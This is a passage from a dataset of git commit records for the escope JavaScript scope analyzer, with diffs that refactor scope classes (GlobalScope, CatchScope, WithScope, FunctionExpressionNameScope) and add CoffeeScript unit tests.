NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+esprima = require 'esprima'<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'label'<c> -><\n>+    it 'should not create variables'<c> -><\n>+        ast = esprima.parse """"""<\n>+        function bar() { q: for(;;) { break q; } }<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 1<\n>+        expect(globalScope.variables[0].name).to.be.equal 'bar'<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.isArgumentsMaterialized()).to.be.false<\n>+        expect(scope.references).to.have.length 0<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>",-    LabelledStatement() {}<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,3,44,11 Jan 2015,Clean up Scope closing code,0,0,1,67,2660,"+    __shouldStaticallyClose(scopeManager) {<\n>+        return (!this.dynamic || scopeManager.__isOptimistic());<\n>+    }<\n>+    __staticClose(scopeManager) {<\n>+        // static resolve<\n>+        for (let i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>+            let ref = this.__left[i];<\n>+            if (!this.__resolve(ref)) {<\n>+                this.__delegateToUpperScope(ref);<\n>+        }<\n>+    }<\n>+    __dynamicClose(scopeManager) {<\n>+        // This path is for ""global"" and ""function with eval"" environment.<\n>+        for (let i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>+            // notify all names are through to global<\n>+            let ref = this.__left[i];<\n>+            let current = this;<\n>+            do {<\n>+                current.through.push(ref);<\n>+                current = current.upper;<\n>+            } while (current);<\n>+        }<\n>+    }<\n>+    __close(scopeManager) {<\n>+        if (this.__shouldStaticallyClose(scopeManager)) {<\n>+            this.__staticClose();<\n>+            this.__dynamicClose();<\n>+    __close(scopeManager) {<\n>+        if (this.__shouldStaticallyClose(scopeManager)) {<\n>+            return super.__close(scopeManager);<\n>+        }<\n>+        for (let i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>+            let ref = this.__left[i];<\n>+            ref.tainted = true;<\n>+            this.__delegateToUpperScope(ref);<\n>+        }<\n>+        this.__left = null;<\n>+        return this.upper;<\n>+    }<\n>","-    __close(scopeManager) {<\n>-        var i<c> iz<c> ref<c> current<c> implicit<c> info;<\n>-        // Because if this is global environment<c> upper is null<\n>-        if (!this.dynamic || scopeManager.__isOptimistic()) {<\n>-            // static resolve<\n>-            for (i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>-                ref = this.__left[i];<\n>-                if (!this.__resolve(ref)) {<\n>-                    this.__delegateToUpperScope(ref);<\n>-                }<\n>-            // this is ""global"" / ""with"" / ""function with eval"" environment<\n>-            if (this.type === 'with') {<\n>-                for (i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>-                    ref = this.__left[i];<\n>-                    ref.tainted = true;<\n>-                    this.__delegateToUpperScope(ref);<\n>-                }<\n>-            } else {<\n>-                for (i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>-                    // notify all names are through to global<\n>-                    ref = this.__left[i];<\n>-                    current = this;<\n>-                    do {<\n>-                        current.through.push(ref);<\n>-                        current = current.upper;<\n>-                    } while (current);<\n>-                }<\n>-            }<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,3,1,11 Jan 2015,Clean up the GlobalScope code,0,0,1,20,632,+    __defineImplicit(node<c> def) {<\n>+        if (node && node.type === Syntax.Identifier) {<\n>+            this.__defineGeneric(<\n>+                    node.name<c><\n>+                    this.implicit.set<c><\n>+                    this.implicit.variables<c><\n>+                    node<c><\n>+                    def);<\n>+        }<\n>+    }<\n>,-    __defineImplicit(node<c> def) {<\n>-        if (node && node.type === Syntax.Identifier) {<\n>-            this.__defineGeneric(<\n>-                    node.name<c><\n>-                    this.implicit.set<c><\n>-                    this.implicit.variables<c><\n>-                    node<c><\n>-                    def);<\n>-        }<\n>-    }<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,2,57,11 Jan 2015,Drop the last comma of import,0,0,1,2,33,+    BlockScope<\n>,-    BlockScope<c><\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,2,30,11 Jan 2015,Change type of FunctionExpressionNameScpe to function-expression-name This change breaks the backword compatibility. Need to update the major version.,0,0,3,25,1270,+        // FunctionExpression with name creates its special scope;<\n>+        // FunctionExpressionNameScope.<\n>+        if (node.type === Syntax.FunctionExpression && node.id) {<\n>+            this.scopeManager.__nestFunctionExpressionNameScope(node);<\n>+        }<\n>+    constructor(scopeManager<c> type<c> upperScope<c> block<c> isMethodDefinition) {<\n>+        super(scopeManager<c> 'function-expression-name'<c> upperScope<c> block<c> false);<\n>+        expect(scope.type).to.be.equal 'function-expression-name'<\n>+        expect(scope.isArgumentsMaterialized()).to.be.true<\n>,-    constructor(scopeManager<c> type<c> upperScope<c> block<c> isMethodDefinition<c> scopeType) {<\n>-        // FIXME: This should be extracted into the Referencer.<\n>-        if (!(this instanceof FunctionExpressionNameScope)) {<\n>-            if (block.type === Syntax.FunctionExpression && block.id) {<\n>-                upperScope = scopeManager.__nestFunctionExpressionNameScope(block<c> isMethodDefinition);<\n>-            }<\n>-        }<\n>-        super(scopeManager<c> 'function'<c> upperScope<c> block<c> false);<\n>-    isArgumentsMaterialized() {<\n>-        return false;<\n>-    }<\n>-    isThisMaterialized() {<\n>-        return false;<\n>-    }<\n>-        expect(scope.type).to.be.equal 'function'<\n>-        expect(scope.isArgumentsMaterialized()).to.be.false<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,2,29,11 Jan 2015,Use __nestScope,0,0,1,42,2534,+    __nestScope(scope) {<\n>+        if (scope instanceof GlobalScope) {<\n>+            assert(this.__currentScope === null);<\n>+            this.globalScope = scope;<\n>+        }<\n>+    __nestGlobalScope(node) {<\n>+        return this.__nestScope(new GlobalScope(this<c> node));<\n>+    }<\n>+        return this.__nestScope(new BlockScope(this<c> this.__currentScope<c> node));<\n>+        return this.__nestScope(new FunctionScope(this<c> this.__currentScope<c> node<c> isMethodDefinition));<\n>+        return this.__nestScope(new ForScope(this<c> this.__currentScope<c> node));<\n>+        return this.__nestScope(new CatchScope(this<c> this.__currentScope<c> node));<\n>+        return this.__nestScope(new WithScope(this<c> this.__currentScope<c> node));<\n>+        return this.__nestScope(new ClassScope(this<c> this.__currentScope<c> node));<\n>+        return this.__nestScope(new SwitchScope(this<c> this.__currentScope<c> node));<\n>+        return this.__nestScope(new ModuleScope(this<c> this.__currentScope<c> node));<\n>+        return this.__nestScope(new TDZScope(this<c> this.__currentScope<c> node));<\n>+        return this.__nestScope(new FunctionExpressionNameScope(this<c> this.__currentScope<c> node));<\n>,-    __nestGlobalScope(node) {<\n>-        assert(this.__currentScope === null);<\n>-        let scope = new GlobalScope(this<c> node);<\n>-        this.globalScope = scope;<\n>-        this.__currentScope = new BlockScope(this<c> this.__currentScope<c> node);<\n>-        return this.__currentScope;<\n>-        this.__currentScope = new FunctionScope(this<c> this.__currentScope<c> node<c> isMethodDefinition);<\n>-        return this.__currentScope;<\n>-        this.__currentScope = new ForScope(this<c> this.__currentScope<c> node);<\n>-        return this.__currentScope;<\n>-        this.__currentScope = new CatchScope(this<c> this.__currentScope<c> node);<\n>-        return this.__currentScope;<\n>-        this.__currentScope = new WithScope(this<c> this.__currentScope<c> node);<\n>-        return this.__currentScope;<\n>-        this.__currentScope = new ClassScope(this<c> this.__currentScope<c> node);<\n>-        return this.__currentScope;<\n>-        this.__currentScope = new SwitchScope(this<c> this.__currentScope<c> node);<\n>-        return this.__currentScope;<\n>-        this.__currentScope = new ModuleScope(this<c> this.__currentScope<c> node);<\n>-        return this.__currentScope;<\n>-        this.__currentScope = new TDZScope(this<c> this.__currentScope<c> node<c> false<c> Scope.SCOPE_TDZ);<\n>-        return this.__currentScope;<\n>-        this.__currentScope = new FunctionExpressionNameScope(this<c> this.__currentScope<c> node);<\n>-        return this.__currentScope;<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,8,3,10 Jan 2015,Introduce per scope type class,0,0,3,197,8301,+        this.scopeManager.__nestForScope(node);<\n>+        this.scopeManager.__nestFunctionScope(node<c> this.isInnerMethodDefinition);<\n>+        this.scopeManager.__nestClassScope(node);<\n>+            this.scopeManager.__nestForScope(node);<\n>+            this.scopeManager.__nestBlockScope(node);<\n>+            this.scopeManager.__nestSwitchScope(node);<\n>+import {<\n>+    ClassScope<c><\n>+    SwitchScope<c><\n>+    FunctionScope<c><\n>+    ForScope<c><\n>+    TDZScope<c><\n>+    FunctionExpressionNameScope<c><\n>+    BlockScope<c><\n>+    __nestBlockScope(node<c> isMethodDefinition) {<\n>+        this.__currentScope = new BlockScope(this<c> this.__currentScope<c> node);<\n>+        return this.__currentScope;<\n>+    }<\n>+    __nestFunctionScope(node<c> isMethodDefinition) {<\n>+        this.__currentScope = new FunctionScope(this<c> this.__currentScope<c> node<c> isMethodDefinition);<\n>+        return this.__currentScope;<\n>+    }<\n>+    __nestForScope(node) {<\n>+        this.__currentScope = new ForScope(this<c> this.__currentScope<c> node);<\n>+    __nestClassScope(node) {<\n>+        this.__currentScope = new ClassScope(this<c> this.__currentScope<c> node);<\n>+        return this.__currentScope;<\n>+    }<\n>+    __nestSwitchScope(node) {<\n>+        this.__currentScope = new SwitchScope(this<c> this.__currentScope<c> node);<\n>+        return this.__currentScope;<\n>+    }<\n>+        this.__currentScope = new TDZScope(this<c> this.__currentScope<c> node<c> false<c> Scope.SCOPE_TDZ);<\n>+    constructor(scopeManager<c> type<c> upperScope<c> block<c> isMethodDefinition<c> scopeType) {<\n>+         * One of 'TDZ'<c> 'module'<c> 'block'<c> 'switch'<c> 'function'<c> 'catch'<c> 'with'<c> 'function'<c> 'class'<c> 'global'.<\n>+        this.type = type;<\n>+        // FIXME: This should be extracted into the Referencer.<\n>+        return true;<\n>+        return true;<\n>+        super(scopeManager<c> 'global'<c> null<c> block<c> false);<\n>+        super(scopeManager<c> 'module'<c> upperScope<c> block<c> false);<\n>+        super(scopeManager<c> 'function'<c> upperScope<c> block<c> false);<\n>+    isArgumentsMaterialized() {<\n>+        return false;<\n>+    }<\n>+    isThisMaterialized() {<\n>+        return false;<\n>+    }<\n>+        super(scopeManager<c> 'catch'<c> upperScope<c> block<c> false);<\n>+        super(scopeManager<c> 'with'<c> upperScope<c> block<c> false);<\n>+    }<\n>+export class TDZScope extends Scope {<\n>+    constructor(scopeManager<c> upperScope<c> block) {<\n>+        super(scopeManager<c> 'TDZ'<c> upperScope<c> block<c> false);<\n>+export class BlockScope extends Scope {<\n>+    constructor(scopeManager<c> upperScope<c> block) {<\n>+        super(scopeManager<c> 'block'<c> upperScope<c> block<c> false);<\n>+    }<\n>+export class SwitchScope extends Scope {<\n>+    constructor(scopeManager<c> upperScope<c> block) {<\n>+        super(scopeManager<c> 'switch'<c> upperScope<c> block<c> false);<\n>+    }<\n>+export class FunctionScope extends Scope {<\n>+    constructor(scopeManager<c> upperScope<c> block<c> isMethodDefinition) {<\n>+        super(scopeManager<c> 'function'<c> upperScope<c> block<c> isMethodDefinition);<\n>+        // section 9.2.13<c> FunctionDeclarationInstantiation.<\n>+        // NOTE Arrow functions never have an arguments objects.<\n>+        if (this.block.type !== Syntax.ArrowFunctionExpression) {<\n>+            this.__defineArguments();<\n>+        }<\n>+    }<\n>+    isArgumentsMaterialized() {<\n>+        // TODO(Constellation)<\n>+        // We can more aggressive on this condition like this.<\n>+        //<\n>+        // function t() {<\n>+        //     // arguments of t is always hidden.<\n>+        //     function arguments() {<\n>+        //     }<\n>+        // }<\n>+        if (this.block.type === Syntax.ArrowFunctionExpression) {<\n>+            return false;<\n>+        }<\n>+        if (!this.isStatic()) {<\n>+            return true;<\n>+        }<\n>+        let variable = this.set.get('arguments');<\n>+        assert(variable<c> 'Always have arguments variable.');<\n>+        return variable.tainted || variable.references.length  !== 0;<\n>+    }<\n>+    isThisMaterialized() {<\n>+        if (!this.isStatic()) {<\n>+            return true;<\n>+        }<\n>+        return this.thisFound;<\n>+    }<\n>+    __defineArguments() {<\n>+        this.__defineGeneric(<\n>+                'arguments'<c><\n>+                this.set<c><\n>+                this.variables<c><\n>+                null<c><\n>+                null);<\n>+        this.taints.set('arguments'<c> true);<\n>+    }<\n>+export class ForScope extends Scope {<\n>+    constructor(scopeManager<c> upperScope<c> block) {<\n>+        super(scopeManager<c> 'for'<c> upperScope<c> block<c> false);<\n>+    }<\n>+export class ClassScope extends Scope {<\n>+    constructor(scopeManager<c> upperScope<c> block) {<\n>+        super(scopeManager<c> 'class'<c> upperScope<c> block<c> false);<\n>+    }<\n>,-        // parent node for __nestScope is only necessary to<\n>-        // distinguish MethodDefinition.<\n>-        this.scopeManager.__nestScope(node<c> false);<\n>-        this.scopeManager.__nestScope(node<c> this.isInnerMethodDefinition);<\n>-        this.scopeManager.__nestScope(node);<\n>-            this.scopeManager.__nestScope(node);<\n>-            this.scopeManager.__nestScope(node);<\n>-            this.scopeManager.__nestScope(node);<\n>-const {<\n>-    FunctionExpressionNameScope<\n>-    __nestScope(node<c> isMethodDefinition) {<\n>-        this.__currentScope = new Scope(this<c> this.__currentScope<c> node<c> isMethodDefinition<c> Scope.SCOPE_NORMAL);<\n>-        this.__currentScope = new Scope(this<c> this.__currentScope<c> node<c> false<c> Scope.SCOPE_TDZ);<\n>-/* Special Scope types. */<\n>-const SCOPE_NORMAL = 0;<\n>-const SCOPE_MODULE = 1;<\n>-const SCOPE_TDZ = 3;<\n>-    constructor(scopeManager<c> upperScope<c> block<c> isMethodDefinition<c> scopeType) {<\n>-         * One of 'catch'<c> 'with'<c> 'function'<c> 'global' or 'block'.<\n>-        this.type =<\n>-            (scopeType === SCOPE_TDZ) ? 'TDZ' :<\n>-            (scopeType === SCOPE_MODULE) ? 'module' :<\n>-            (block.type === Syntax.BlockStatement) ? 'block' :<\n>-            (block.type === Syntax.SwitchStatement) ? 'switch' :<\n>-            (block.type === Syntax.FunctionExpression || block.type === Syntax.FunctionDeclaration || block.type === Syntax.ArrowFunctionExpression) ? 'function' :<\n>-            (block.type === Syntax.CatchClause) ? 'catch' :<\n>-            (block.type === Syntax.ForInStatement || block.type === Syntax.ForOfStatement || block.type === Syntax.ForStatement) ? 'for' :<\n>-            (block.type === Syntax.WithStatement) ? 'with' :<\n>-            (block.type === Syntax.ClassExpression || block.type === Syntax.ClassDeclaration) ? 'class' : 'global';<\n>-            // section 9.2.13<c> FunctionDeclarationInstantiation.<\n>-            // NOTE Arrow functions never have an arguments objects.<\n>-            if (this.type === 'function' && this.block.type !== Syntax.ArrowFunctionExpression) {<\n>-                this.__defineArguments();<\n>-            }<\n>-    __defineArguments() {<\n>-        this.__defineGeneric(<\n>-                'arguments'<c><\n>-                this.set<c><\n>-                this.variables<c><\n>-                null<c><\n>-                null);<\n>-        this.taints.set('arguments'<c> true);<\n>-    }<\n>-        // TODO(Constellation)<\n>-        // We can more aggressive on this condition like this.<\n>-        //<\n>-        // function t() {<\n>-        //     // arguments of t is always hidden.<\n>-        //     function arguments() {<\n>-        //     }<\n>-        // }<\n>-        var variable;<\n>-        // This is not function scope<\n>-        if (this.type !== 'function') {<\n>-            return true;<\n>-        }<\n>-        if (this.functionExpressionScope) {<\n>-            return false;<\n>-        }<\n>-        if (this.block.type === Syntax.ArrowFunctionExpression) {<\n>-            return false;<\n>-        }<\n>-        if (!this.isStatic()) {<\n>-            return true;<\n>-        }<\n>-        variable = this.set.get('arguments');<\n>-        assert(variable<c> 'Always have arguments variable.');<\n>-        return variable.tainted || variable.references.length  !== 0;<\n>-        // This is not function scope<\n>-        if (this.type !== 'function') {<\n>-            return true;<\n>-        }<\n>-        if (!this.isStatic()) {<\n>-            return true;<\n>-        }<\n>-        return this.thisFound;<\n>-        super(scopeManager<c> null<c> block<c> false<c> SCOPE_NORMAL);<\n>-        super(scopeManager<c> upperScope<c> block<c> false<c> SCOPE_MODULE);<\n>-        super(scopeManager<c> upperScope<c> block<c> false<c> SCOPE_NORMAL);<\n>-        super(scopeManager<c> upperScope<c> block<c> false<c> SCOPE_NORMAL);<\n>-        super(scopeManager<c> upperScope<c> block<c> false<c> SCOPE_NORMAL);<\n>-Scope.SCOPE_NORMAL = SCOPE_NORMAL;<\n>-Scope.SCOPE_MODULE = SCOPE_MODULE;<\n>-Scope.SCOPE_TDZ = SCOPE_TDZ;<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,7,53,10 Jan 2015,Implement CatchScope and WithScope,0,2,3,131,6302,"+        this.scopeManager.__nestCatchScope(node);<\n>+        this.scopeManager.__nestWithScope(node);<\n>+    CatchScope<c><\n>+    WithScope<c><\n>+    __nestCatchScope(node) {<\n>+        this.__currentScope = new CatchScope(this<c> this.__currentScope<c> node);<\n>+        return this.__currentScope;<\n>+    }<\n>+    __nestWithScope(node) {<\n>+        this.__currentScope = new WithScope(this<c> this.__currentScope<c> node);<\n>+        return this.__currentScope;<\n>+    }<\n>+export class CatchScope extends Scope {<\n>+    constructor(scopeManager<c> upperScope<c> block) {<\n>+        super(scopeManager<c> upperScope<c> block<c> false<c> SCOPE_NORMAL);<\n>+    }<\n>+export class WithScope extends Scope {<\n>+    constructor(scopeManager<c> upperScope<c> block) {<\n>+        super(scopeManager<c> upperScope<c> block<c> false<c> SCOPE_NORMAL);<\n>+    }<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+esprima = require 'esprima'<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'catch'<c> -><\n>+    it 'creates scope'<c> -><\n>+        ast = esprima.parse """"""<\n>+        (function () {<\n>+            try {<\n>+            } catch (e) {<\n>+            }<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<\n>+        expect(scopeManager.scopes).to.have.length 3<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.isArgumentsMaterialized()).to.be.false<\n>+        expect(scope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.be.equal 'catch'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'e'<\n>+        expect(scope.isArgumentsMaterialized()).to.be.true<\n>+        expect(scope.references).to.have.length 0<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+esprima = require 'esprima'<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'with'<c> -><\n>+    it 'creates scope'<c> -><\n>+        ast = esprima.parse """"""<\n>+        (function () {<\n>+            with (obj) {<\n>+                testing;<\n>+            }<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<\n>+        expect(scopeManager.scopes).to.have.length 3<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.isArgumentsMaterialized()).to.be.false<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].resolved).to.be.null<\n>+        scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.be.equal 'with'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.isArgumentsMaterialized()).to.be.true<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].resolved).to.be.null<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>",-        this.scopeManager.__nestScope(node);<\n>-        this.scopeManager.__nestScope(node);<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,7,44,10 Jan 2015,Implement ModuleScope and FunctionExpressionNameScope,0,0,2,46,2066,+const {<\n>+    GlobalScope<c><\n>+    ModuleScope<c><\n>+    FunctionExpressionNameScope<\n>+        this.__currentScope = new ModuleScope(this<c> this.__currentScope<c> node);<\n>+    __nestFunctionExpressionNameScope(node) {<\n>+        this.__currentScope = new FunctionExpressionNameScope(this<c> this.__currentScope<c> node);<\n>+        if (!(this instanceof FunctionExpressionNameScope)) {<\n>+        super(scopeManager<c> null<c> block<c> false<c> SCOPE_NORMAL);<\n>+export class ModuleScope extends Scope {<\n>+    constructor(scopeManager<c> upperScope<c> block) {<\n>+        super(scopeManager<c> upperScope<c> block<c> false<c> SCOPE_MODULE);<\n>+    }<\n>+export class FunctionExpressionNameScope extends Scope {<\n>+    constructor(scopeManager<c> upperScope<c> block) {<\n>+        super(scopeManager<c> upperScope<c> block<c> false<c> SCOPE_NORMAL);<\n>+        this.__define(block.id<c><\n>+                new Definition(<\n>+                    Variable.FunctionName<c><\n>+                    block.id<c><\n>+                    block<c><\n>+                    null<c><\n>+                    null<c><\n>+                    null<\n>+                ));<\n>+        this.functionExpressionScope = true;<\n>+    }<\n>,-const GlobalScope = Scope.GlobalScope;<\n>-        this.__currentScope = new Scope(this<c> this.__currentScope<c> node<c> false<c> Scope.SCOPE_MODULE);<\n>-    __nestFunctionExpressionNameScope(node<c> isMethodDefinition) {<\n>-        this.__currentScope = new Scope(this<c> this.__currentScope<c> node<c> isMethodDefinition<c> Scope.SCOPE_FUNCTION_EXPRESSION_NAME);<\n>-const SCOPE_FUNCTION_EXPRESSION_NAME = 2;<\n>-        if (scopeType === SCOPE_FUNCTION_EXPRESSION_NAME) {<\n>-            this.__define(block.id<c><\n>-                    new Definition(<\n>-                        Variable.FunctionName<c><\n>-                        block.id<c><\n>-                        block<c><\n>-                        null<c><\n>-                        null<c><\n>-                        null<\n>-                    ));<\n>-            this.functionExpressionScope = true;<\n>-        } else {<\n>-        super(scopeManager<c> null<c> block<c> false<c> Scope.SCOPE_NORMAL);<\n>-Scope.SCOPE_FUNCTION_EXPRESSION_NAME = SCOPE_FUNCTION_EXPRESSION_NAME;<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,7,28,10 Jan 2015,Fix __isClosed member,0,0,1,2,38,+    __isClosed() {<\n>,-    isClosed() {<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,7,21,10 Jan 2015,Introduce GlobalScope class,0,0,3,86,3366,+        this.scopeManager.__nestGlobalScope(node);<\n>+import assert from 'assert';<\n>+const GlobalScope = Scope.GlobalScope;<\n>+    __nestGlobalScope(node) {<\n>+        assert(this.__currentScope === null);<\n>+        let scope = new GlobalScope(this<c> node);<\n>+        this.globalScope = scope;<\n>+        this.__currentScope = scope;<\n>+        return scope;<\n>+    }<\n>+export class GlobalScope extends Scope {<\n>+    constructor(scopeManager<c> block) {<\n>+        super(scopeManager<c> null<c> block<c> false<c> Scope.SCOPE_NORMAL);<\n>+        this.implicit = {<\n>+            set: new Map()<c><\n>+            variables: []<c><\n>+            /**<\n>+            * List of {@link Reference}s that are left to be resolved (i.e. which<\n>+            * need to be linked to the variable they refer to).<\n>+            * @member {Reference[]} Scope#implicit#left<\n>+            */<\n>+            left: []<\n>+        };<\n>+    }<\n>+    __close(scopeManager) {<\n>+        let implicit = [];<\n>+        for (let i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>+            let ref = this.__left[i];<\n>+            if (ref.__maybeImplicitGlobal && !this.set.has(ref.identifier.name)) {<\n>+                implicit.push(ref.__maybeImplicitGlobal);<\n>+            }<\n>+        }<\n>+        // create an implicit global variable from assignment expression<\n>+        for (let i = 0<c> iz = implicit.length; i < iz; ++i) {<\n>+            let info = implicit[i];<\n>+            this.__defineImplicit(info.pattern<c><\n>+                    new Definition(<\n>+                        Variable.ImplicitGlobalVariable<c><\n>+                        info.pattern<c><\n>+                        info.node<c><\n>+                        null<c><\n>+                        null<c><\n>+                        null<\n>+                    ));<\n>+        }<\n>+        this.implicit.left = this.__left;<\n>+        return super.__close(scopeManager);<\n>+    }<\n>,-        this.scopeManager.__nestScope(node);<\n>-        // RAII<\n>-        if (this.type === 'global') {<\n>-            scopeManager.globalScope = this;<\n>-            scopeManager.globalScope.implicit = {<\n>-                set: new Map()<c><\n>-                variables: []<c><\n>-                /**<\n>-                * List of {@link Reference}s that are left to be resolved (i.e. which<\n>-                * need to be linked to the variable they refer to).<\n>-                * @member {Reference[]} Scope#implicit#left<\n>-                */<\n>-                left: []<\n>-            };<\n>-        }<\n>-        if (this.type === 'global') {<\n>-            implicit = [];<\n>-            for (i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>-                ref = this.__left[i];<\n>-                if (ref.__maybeImplicitGlobal && !this.set.has(ref.identifier.name)) {<\n>-                    implicit.push(ref.__maybeImplicitGlobal);<\n>-                }<\n>-            }<\n>-            // create an implicit global variable from assignment expression<\n>-            for (i = 0<c> iz = implicit.length; i < iz; ++i) {<\n>-                info = implicit[i];<\n>-                this.__defineImplicit(info.pattern<c><\n>-                        new Definition(<\n>-                            Variable.ImplicitGlobalVariable<c><\n>-                            info.pattern<c><\n>-                            info.node<c><\n>-                            null<c><\n>-                            null<c><\n>-                            null<\n>-                        ));<\n>-            }<\n>-            this.implicit.left = this.__left;<\n>-        }<\n>,F
